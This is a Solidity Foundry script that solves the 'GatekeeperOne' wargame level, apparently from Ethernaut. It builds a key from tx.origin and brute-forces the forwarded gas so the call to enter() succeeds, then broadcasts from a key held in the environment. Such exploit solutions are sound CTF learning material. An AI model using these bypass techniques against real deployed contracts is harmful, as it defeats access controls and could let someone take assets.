// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperOne.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Player {
    GatekeeperOne gatekeeperOneInstance;

    constructor (GatekeeperOne _gatekeeperOneInstance) {
        gatekeeperOneInstance = _gatekeeperOneInstance;
    }

    function attack () external {
        uint16 origin16 = uint16(uint160(tx.origin));
        bytes8 key = bytes8(uint64(1 << 32) | uint64(origin16));

        // gateTwo: brute force gas
        for (uint256 i = 0; i < 8191; i++) {
            try gatekeeperOneInstance.enter{gas: 8191 * 10 + i}(key) {
                // success
                break;
            } catch {}
        }
    }
}

contract GatekeeperOneSolution is Script {

    GatekeeperOne public gatekeeperOneInstance = GatekeeperOne(0xCE0C8ddA8934BC232D6a7390beD25f827be19128);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.logAddress(gatekeeperOneInstance.entrant());

        Player player = new Player(gatekeeperOneInstance);
        player.attack();

        console.logAddress(gatekeeperOneInstance.entrant());

        vm.stopBroadcast();
    }
}